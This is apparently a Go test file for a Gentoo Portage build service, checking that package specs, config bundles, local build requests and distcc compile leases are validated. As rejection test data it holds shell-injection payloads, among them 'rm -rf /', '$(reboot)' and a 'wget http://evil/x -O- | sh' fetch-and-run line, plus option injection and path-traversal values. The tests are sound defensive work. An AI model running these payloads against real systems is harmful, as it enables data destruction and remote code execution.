package builder

import (
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/slchris/portage-engine/internal/distcc"
)

func TestValidatePackageSpec_Valid(t *testing.T) {
	valid := []PackageSpec{
		{Atom: "dev-lang/python"},
		{Atom: "dev-lang/python", Version: "3.11.0"},
		{Atom: "dev-lang/python:3.11", UseFlags: []string{"ssl", "-tk", "+sqlite"}},
		{Atom: "sys-devel/gcc", Version: "13.2.0", Keywords: []string{"~amd64", "amd64"}},
		{Atom: "app-misc/foo", Environment: map[string]string{"MAKEOPTS": "-j8", "CFLAGS": "-O2 -pipe"}},
	}
	for _, pkg := range valid {
		if err := validatePackageSpec(pkg); err != nil {
			t.Errorf("validatePackageSpec(%+v) unexpectedly failed: %v", pkg, err)
		}
	}
}

func TestValidatePackageSpec_RejectsInjection(t *testing.T) {
	bad := []PackageSpec{
		{Atom: "foo; rm -rf /"},
		{Atom: "dev-lang/python", Version: "3.11$(reboot)"},
		{Atom: "dev-lang/python", UseFlags: []string{"ssl; wget http://evil/x -O- | sh"}},
		{Atom: "dev-lang/python", Keywords: []string{"amd64`id`"}},
		{Atom: "dev-lang/python", Environment: map[string]string{"X": "$(reboot)"}},
		{Atom: "dev-lang/python", Environment: map[string]string{"BAD KEY": "value"}},
		{Atom: "--config-root=/etc"}, // option injection
		{Atom: ""},
	}
	for _, pkg := range bad {
		if err := validatePackageSpec(pkg); err == nil {
			t.Errorf("validatePackageSpec(%+v) should have been rejected", pkg)
		}
	}
}

func TestValidateBundle(t *testing.T) {
	if err := validateBundle(nil); err == nil {
		t.Error("nil bundle should be rejected")
	}

	empty := &ConfigBundle{Packages: &BuildPackageSpec{}}
	if err := validateBundle(empty); err == nil {
		t.Error("bundle with no packages should be rejected")
	}

	bad := &ConfigBundle{Packages: &BuildPackageSpec{Packages: []PackageSpec{{Atom: "foo; id"}}}}
	if err := validateBundle(bad); err == nil {
		t.Error("bundle with an injecting atom should be rejected")
	}

	good := &ConfigBundle{
		Config:   &PortageConfig{Environment: map[string]string{"MAKEOPTS": "-j4"}},
		Packages: &BuildPackageSpec{Packages: []PackageSpec{{Atom: "dev-lang/python", Version: "3.11.0"}}},
	}
	if err := validateBundle(good); err != nil {
		t.Errorf("valid bundle rejected: %v", err)
	}
}

func validSecurityTestBundle() *ConfigBundle {
	return &ConfigBundle{
		Config: &PortageConfig{
			PackageUse: map[string][]string{
				">=dev-lang/python-3.11": {"ssl", "-tk"},
			},
			PackageKeywords: map[string][]string{
				"dev-lang/python": {"~amd64"},
			},
			PackageMask: []string{"<dev-lang/python-3.11"},
			MakeConf: map[string]string{
				"CFLAGS":   "-O2 -pipe",
				"MAKEOPTS": "-j8 -l8",
			},
			Environment: map[string]string{"LC_ALL": "C"},
			GlobalUse:   []string{"ssl", "-test"},
			Repos: []RepoConfig{{
				Name:     "gentoo",
				Location: "/var/db/repos/gentoo",
				SyncType: "git",
				SyncURI:  "https://github.com/gentoo-mirror/gentoo.git",
			}},
		},
		Packages: &BuildPackageSpec{Packages: []PackageSpec{{
			Atom:        "dev-lang/python",
			Version:     "3.11.9",
			UseFlags:    []string{"ssl"},
			Environment: map[string]string{"PYTHON_TARGETS": "python3_11"},
		}}},
		Metadata: BundleMetadata{
			UserID:      "developer@example.org",
			TargetArch:  "amd64",
			Profile:     "default/linux/amd64/23.0",
			CreatedAt:   time.Now().UTC().Format(time.RFC3339),
			Description: "security validation test",
		},
	}
}

func TestValidateBundle_AllFields(t *testing.T) {
	if err := validateBundle(validSecurityTestBundle()); err != nil {
		t.Fatalf("valid full bundle rejected: %v", err)
	}
}

func TestValidateBundleAllowsIntegrityProtectedHTTPGitMirror(t *testing.T) {
	bundle := validSecurityTestBundle()
	repo := &bundle.Config.Repos[0]
	repo.SyncURI = "http://mirror.internal/gentoo.bundle"
	repo.Revision = strings.Repeat("a", 40)
	repo.Digest = "sha256:" + strings.Repeat("b", 64)
	if err := validateBundle(bundle); err != nil {
		t.Fatalf("integrity-protected HTTP Git mirror was rejected: %v", err)
	}

	bundle = validSecurityTestBundle()
	repo = &bundle.Config.Repos[0]
	repo.SyncURI = "http://mirror.internal/gentoo.bundle"
	repo.Revision = strings.Repeat("a", 40)
	if err := validateBundle(bundle); err == nil || !strings.Contains(err.Error(), "snapshot digest") {
		t.Fatalf("HTTP Git mirror without digest was accepted: %v", err)
	}
}

func TestValidateBundle_RejectsUnsafeConfig(t *testing.T) {
	tests := []struct {
		name   string
		mutate func(*ConfigBundle)
		want   string
	}{
		{
			name: "missing config",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config = nil
			},
			want: "no Portage config",
		},
		{
			name: "operator controlled FEATURES",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.MakeConf["FEATURES"] = "-sandbox"
			},
			want: "not allowed",
		},
		{
			name: "make conf command substitution",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.MakeConf["CFLAGS"] = "$(touch /tmp/pwned)"
			},
			want: "invalid value",
		},
		{
			name: "excessive make jobs",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.MakeConf["MAKEOPTS"] = "-j65"
			},
			want: "allowed range",
		},
		{
			name: "package rule injection",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.PackageUse = map[string][]string{"dev-lang/python\nFEATURES=-sandbox": {"ssl"}}
			},
			want: "invalid package atom",
		},
		{
			name: "mask injection",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.PackageMask = []string{"dev-lang/python; touch /tmp/pwned"}
			},
			want: "invalid package atom",
		},
		{
			name: "repo name path traversal",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.Repos[0].Name = "../../etc/portage"
			},
			want: "invalid repository name",
		},
		{
			name: "repo arbitrary location",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.Repos[0].Location = "/etc/portage"
			},
			want: "location must be",
		},
		{
			name: "repo local file URI",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.Repos[0].SyncURI = "file:///etc"
			},
			want: "invalid sync URI",
		},
		{
			name: "repo URI credentials",
			mutate: func(bundle *ConfigBundle) {
				bundle.Config.Repos[0].SyncURI = "https://user:secret@example.org/repo.git"
			},
			want: "invalid sync URI",
		},
		{
			name: "profile traversal",
			mutate: func(bundle *ConfigBundle) {
				bundle.Metadata.Profile = "default/linux/../evil"
			},
			want: "invalid bundle profile",
		},
		{
			name: "duplicate package",
			mutate: func(bundle *ConfigBundle) {
				bundle.Packages.Packages = append(bundle.Packages.Packages, bundle.Packages.Packages[0])
			},
			want: "duplicate package",
		},
		{
			name: "too many packages",
			mutate: func(bundle *ConfigBundle) {
				bundle.Packages.Packages = make([]PackageSpec, maxBundlePackages+1)
			},
			want: "too many packages",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bundle := validSecurityTestBundle()
			tt.mutate(bundle)
			err := validateBundle(bundle)
			if err == nil {
				t.Fatal("unsafe bundle was accepted")
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("error %q does not contain %q", err, tt.want)
			}
		})
	}
}

func TestValidateBuildRequest_RejectsInvalidBundleBeforeQueue(t *testing.T) {
	bundle := validSecurityTestBundle()
	bundle.Config.Repos[0].Name = "../escape"
	req := &BuildRequest{PackageName: "dev-lang/python", ConfigBundle: bundle}
	if err := validateBuildRequest(req); err == nil {
		t.Fatal("server-side validation accepted an unsafe ConfigBundle")
	}
}

// TestSubmitBuildRejectsInjection is the regression test for the command- and
// option-injection findings: the LocalBuilder must reject a malicious
// package_name / USE flag on EVERY path (not just the config-bundle path).
func TestValidateLocalBuildRequest_RejectsInjection(t *testing.T) {
	bad := []*LocalBuildRequest{
		{PackageName: "a/b; touch /pwned #"}, // shell metacharacters
		{PackageName: "--info"},              // emerge option injection (native path)
		{PackageName: "--config-root=/etc"},  // option injection
		{PackageName: "dev-lang/python", Version: "3$(reboot)"},
		{PackageName: "dev-lang/python", UseFlags: map[string]string{"ssl; rm -rf /": "enabled"}},
		{PackageName: "dev-lang/python", Environment: map[string]string{"X": "$(id)"}},
		{PackageName: ""},
	}
	for _, req := range bad {
		if err := validateLocalBuildRequest(req); err == nil {
			t.Errorf("validateLocalBuildRequest(%+v) should have been rejected", req)
		}
	}

	// A legitimate request passes.
	ok := &LocalBuildRequest{
		PackageName: "dev-lang/python",
		Version:     "3.11.0",
		UseFlags:    map[string]string{"ssl": "enabled", "-tk": "disabled"},
	}
	if err := validateLocalBuildRequest(ok); err != nil {
		t.Errorf("valid request rejected: %v", err)
	}
}

// distccTestLease is a well-formed lease. Every case below changes one fact.
func distccTestLease(t *testing.T, expiresAt time.Time, fallback string) *distcc.Lease {
	t.Helper()
	pool := distcc.Pool{
		Architecture: "amd64", CHOST: "x86_64-pc-linux-gnu",
		CompilerDigest:           "sha256:" + strings.Repeat("a", 64),
		ToolchainImageGeneration: "gentoo-g1", CPUFeatures: []string{"avx2"},
		NetworkZone:        "build-a",
		ProjectTrustDomain: "6f0b8f0a-6a4e-4e0e-9f2f-2a0b6f1f4c11",
	}
	poolID, err := pool.ID()
	if err != nil {
		t.Fatal(err)
	}
	return &distcc.Lease{
		ID: "lease-a", WorkerID: "worker-a", WorkerEndpoint: "10.44.0.9:3632",
		BuilderID: "builder-a", BuilderNetworkIdentity: "worker-cert:a",
		AttemptID: "8d6a1f6c-9d0d-4a4f-9a29-1f1a0d2b3c44", AttemptFence: 5,
		Fence: 7, Slots: 2, PoolID: poolID, Pool: pool,
		FallbackPolicy: fallback, ExpiresAt: expiresAt,
	}
}

// TestAnExpiredLeaseFailsTheBuildOnlyUnderABlockedFallback covers the request
// that waited longer than its compile-slot reservation.
//
// Admission used to run the whole lease through Validate, which reports expiry,
// so a scheduling delay turned into a rejected request and a failed build — for
// a build the builder was ready to compile locally, since configureDistCC
// already takes the controlled local fallback when Authorize refuses the lease
// for the very same reason. Under a blocked policy the operator asked for the
// opposite, and refusing at admission is the earliest place to give it to them.
func TestAnExpiredLeaseFailsTheBuildOnlyUnderABlockedFallback(t *testing.T) {
	expired := time.Now().Add(-time.Minute)
	live := time.Now().Add(time.Minute)
	for _, test := range []struct {
		name       string
		expiresAt  time.Time
		fallback   string
		wantReject bool
	}{
		{name: "live lease, local fallback", expiresAt: live, fallback: distcc.FallbackLocal},
		{name: "live lease, blocked fallback", expiresAt: live, fallback: distcc.FallbackBlocked},
		{
			name:      "expired lease degrades under a local fallback",
			expiresAt: expired, fallback: distcc.FallbackLocal,
		},
		{
			name:      "expired lease is refused under a blocked fallback",
			expiresAt: expired, fallback: distcc.FallbackBlocked, wantReject: true,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			lease := distccTestLease(t, test.expiresAt, test.fallback)
			req := &LocalBuildRequest{
				PackageName: "sys-devel/gcc",
				ProjectID:   lease.Pool.ProjectTrustDomain,
				AttemptID:   lease.AttemptID, AttemptFence: lease.AttemptFence,
				CompileLease: lease,
			}
			err := validateLocalBuildRequest(req)
			if test.wantReject {
				if err == nil || !errors.Is(err, distcc.ErrLeaseExpired) {
					t.Fatalf("blocked fallback accepted an expired lease: %v", err)
				}
				return
			}
			if err != nil {
				t.Fatalf("rejected an admissible request: %v", err)
			}
		})
	}
}

// A malformed lease is still refused whatever the fallback policy says: the
// fallback covers a reservation that ran out, not one that was never coherent.
func TestAMalformedLeaseIsRefusedUnderEveryFallbackPolicy(t *testing.T) {
	for _, fallback := range []string{distcc.FallbackLocal, distcc.FallbackBlocked} {
		lease := distccTestLease(t, time.Now().Add(time.Minute), fallback)
		lease.Pump = true
		req := &LocalBuildRequest{
			PackageName: "sys-devel/gcc",
			ProjectID:   lease.Pool.ProjectTrustDomain,
			AttemptID:   lease.AttemptID, AttemptFence: lease.AttemptFence,
			CompileLease: lease,
		}
		if err := validateLocalBuildRequest(req); err == nil {
			t.Fatalf("%s fallback accepted a pump-mode lease", fallback)
		}
	}
}
